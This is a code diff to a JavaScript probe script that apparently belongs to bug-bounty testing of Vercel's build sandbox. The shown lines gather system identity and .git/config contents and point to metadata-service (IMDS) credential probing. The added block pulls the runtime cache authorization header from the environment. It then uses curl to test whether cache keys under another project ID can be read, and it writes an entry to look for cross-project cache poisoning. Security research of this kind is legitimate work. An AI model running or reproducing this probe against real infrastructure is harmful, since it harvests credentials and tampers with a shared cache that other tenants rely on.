@@ -126,7 +126,7 @@ function tryDecrypt(keyStr, contentStr) {
 }
 
 const report = {
-  marker: "VERCEL-AGENT-PROBE-7F3A2C-v13",
+  marker: "VERCEL-AGENT-PROBE-7F3A2C-v14",
   whoami: safe(() => execSync("id; uname -a; pwd").toString().trim()),
   // credential-bearing surfaces (own sandbox only)
   gitConfig: safe(() => readFileSync(".git/config", "utf8")),
@@ -482,6 +482,34 @@ const report = {
       noAuthBody: safe(() => readFileSync('/tmp/ca_noauth','utf8').slice(0,100)),
     };
     return scopeCheck;
+  }),
+  // Cross-project suspense cache scope test:
+  // Can we read OUR key with a JWT that has a DIFFERENT projectId claim?
+  // If server enforces projectId in JWT → 403. If not → cross-project cache poisoning possible.
+  // Strategy: try GETting our known key with NO auth, and also try with a spoofed projectId in the key URL path
+  // (We can't forge the JWT itself, but we can test what the server enforces server-side)
+  crossProjectCacheTest: safe(() => {
+    const ep = process.env.RUNTIME_CACHE_ENDPOINT || '';
+    const hdrsRaw = process.env.RUNTIME_CACHE_HEADERS || '';
+    if (!ep || !hdrsRaw) return 'missing-cache-config';
+    let auth = '';
+    try { auth = JSON.parse(hdrsRaw)['Authorization'] || ''; } catch(_) {}
+    const a = auth ? `-H 'Authorization: ${auth.replace(/'/g,"'\\''")}' ` : '';
+    const ourKey = 'probe-bounty-test-key';
+    // Test 1: Read our own key (baseline — should work)
+    const ownRead = safe(() => execSync(`curl -s --max-time 5 -w '%{http_code}' -o /tmp/cp_own ${a}'${ep}${ourKey}' 2>/dev/null || true`).toString().trim());
+    const ownBody = safe(() => readFileSync('/tmp/cp_own','utf8').slice(0,100));
+    // Test 2: Try to read a key from a KNOWN OTHER project ID format (e.g., wrong project ID prefix)
+    // This tests if the server ONLY checks auth but doesn't validate key ownership by projectId
+    const wrongProjKey = `prj_AAAAAAAAAAAAAAAAAAAAAAAAAAAA/${ourKey}`;
+    const wrongProjRead = safe(() => execSync(`curl -s --max-time 5 -w '%{http_code}' -o /tmp/cp_wp ${a}'${ep}${wrongProjKey}' 2>/dev/null || true`).toString().trim());
+    const wrongProjBody = safe(() => readFileSync('/tmp/cp_wp','utf8').slice(0,100));
+    // Test 3: Write a key using our auth, but path our projectId explicitly
+    const ourProjId = process.env.VERCEL_PROJECT_ID || '';
+    const explicitProjKey = `${ourProjId}/${ourKey}`;
+    const explicitWrite = safe(() => execSync(`curl -s --max-time 5 -X POST -H 'Content-Type: application/json' -H 'x-vercel-cache-control: max-age=300' ${a}-d '{"kind":"FETCH","data":{"headers":{},"body":"explicit-proj-test","url":"","status":200},"tags":["probe"],"revalidate":300}' -w '%{http_code}' -o /tmp/cp_ep '${ep}${explicitProjKey}' 2>/dev/null || true`).toString().trim());
+    const explicitBody = safe(() => readFileSync('/tmp/cp_ep','utf8').slice(0,100));
+    return { ownRead, ownBody, wrongProjRead, wrongProjBody, explicitWrite, explicitBody };
   }),
   // IMDS probing — additional MMDS paths beyond IAM credentials
   imds: safe(() => {
